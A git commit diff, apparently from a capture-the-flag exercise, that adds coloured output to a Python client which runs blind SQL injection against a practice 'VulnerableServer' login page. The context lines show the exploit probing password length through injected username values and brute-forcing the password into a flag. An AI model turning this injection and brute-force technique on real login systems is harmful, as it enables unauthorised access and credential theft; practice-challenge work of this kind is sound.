5c1e0d0dd59dc207a2d668626a58819d366eda3e
elc1798 <subliminalmau5@gmail.com>
2015-03-19 20:35:01 -0400

    Beautification :)

--- VulnerableServer-60/client.py
+++ VulnerableServer-60/client.py
@@ -21,7 +21,7 @@ SUFFIX = "%\" -- "
 def brute():
     print "Querying pass length..."
     length = get_pass_length()
-    print "Got password length: " + str(length)
+    print "\nGot password length: " + str(length)
     print "Running brute force..."
     answer = ""
     for i in range(0 , length):
@@ -34,7 +34,7 @@ def brute():
                 break
 
     print ""
-    print "FLAG: " + answer
+    print "FLAG: " + "\033[1;31m" + answer + "\033[m"
 
 def get_pass_length():
     length = 0
@@ -43,8 +43,9 @@ def get_pass_length():
     POSITIVE = "You're in!"
     query_status = True
     while query_status:
+        OUT = HOST + "?username=" + QUERY + "\033[1;31m" + str(length) + "\033[m" + COMMENT + "&password="
         TMP = HOST + "?username=" + QUERY + str(length) + COMMENT + "&password="
-        print "Query: " + TMP
+        print "Query: " + OUT
         sys.stdout.write("\033[F") # Cursor up one line
         TMP = TMP.replace(" " , "%20")
         request = urllib2.Request(TMP , "")
